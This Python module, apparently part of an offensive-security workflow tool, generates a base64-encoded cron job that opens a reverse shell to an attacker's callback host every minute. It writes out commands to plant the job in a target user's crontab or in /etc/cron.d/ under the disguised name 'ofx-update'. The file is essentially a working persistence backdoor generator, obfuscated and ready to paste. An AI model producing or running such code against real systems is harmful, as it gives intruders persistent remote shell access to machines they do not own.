"""Generate a base64-encoded reverse-shell cron job for manual installation.

The cron entry is written to a run-scoped file and published together with the
target/username it must be installed for. This workflow does not modify any
host's crontab — installation is manual by design.
"""

import base64
import os


def _run_dir(ctx) -> str:
    run_dir = os.environ.get("OFX_RUN_DIR") or str(ctx.env.get("OFX_RUN_DIR") or "")
    if not run_dir:
        raise RuntimeError("OFX_RUN_DIR is not set; cannot write the cron payload")
    return run_dir


def run(ctx):
    lhost = str(ctx.inputs.get("lhost") or "").strip()
    if not lhost:
        raise ValueError("'lhost' (callback host) is required")
    lport = str(ctx.inputs.get("lport") or "").strip()
    if not lport:
        raise ValueError("'lport' (callback port) is required")

    target = str(ctx.inputs.get("target") or "").strip()
    if not target:
        raise ValueError("'target' is required")
    username = str(ctx.inputs.get("username") or "").strip()
    if not username:
        raise ValueError("'username' is required")

    payload = (
        f"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    )
    encoded = base64.b64encode(payload.encode()).decode()

    run_dir = _run_dir(ctx)
    cron_file = os.path.join(run_dir, "cron_persistence.txt")
    with open(cron_file, "w", encoding="utf-8") as handle:
        handle.write("# cron persistence — MANUAL INSTALL REQUIRED\n")
        handle.write(f"# target: {username}@{target}\n\n")
        handle.write("# Option 1 — append to the target's crontab:\n")
        handle.write(f"echo {encoded} | base64 -d >> /var/spool/cron/crontabs/{username}\n\n")
        handle.write("# Option 2 — drop-in file (root):\n")
        handle.write(f"echo {encoded} | base64 -d > /etc/cron.d/ofx-update\n")

    print(f"[+] Cron payload written to {cron_file}")
    print("[!] No persistence is established by this workflow; install manually")
    ctx.add_outputs(
        payload=payload,
        encoded=encoded,
        cron_file=cron_file,
        target=target,
        username=username,
    )
